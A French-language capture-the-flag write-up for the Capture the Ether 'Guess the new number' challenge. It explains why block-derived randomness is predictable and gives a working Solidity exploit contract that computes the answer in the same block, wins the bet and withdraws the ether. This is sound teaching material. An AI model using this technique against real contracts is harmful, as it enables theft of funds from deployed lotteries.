# Gess the new number

## Intitulé 

[Url du challenge](https://capturetheether.com/challenges/lotteries/guess-the-new-number/)

> The number is now generated on-demand when a guess is made.

## Solution

Maintenant, la réponse est calculée au moment où on appelle la fonction `guess`. Comme la réponse dépend du bloc minée dans lequel la transaction se trouve. Si on trouve la réponse, il faudrait donc que le bloc soit miné immédiatement, ce qui n'est pas possible... sauf si on appelle un autre smart contract !

Ouvrons [Remix](https://remix.ethereum.org/) et créons un smart contract qui vas réaliser notre challenge.

```solidity

contract Exploit {

    // on calcule la réponse et on attaque
    function attack(GuessTheNewNumberChallenge challenge) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        challenge.guess.value(1 ether)(answer);
    }

    // pour accepter les eth, sans cette fonction, on aurait un revert en réussissant le challenge
    function() external payable {}

    // pour withdraw
    function withdraw() external {
        msg.sender.transfer(2 ether);
    }
}
```
Dans le même fichier solidity, copier les 2 contrats à la suite (Challenge.sol et l'Exploit). Compiler et lancer la fonction `attack` avec comme argument l'addresse du challenge. Penser à utiliser la fonction `withdraw` pour récupérer vos fonds. Il ne reste qu'à valider le challenge.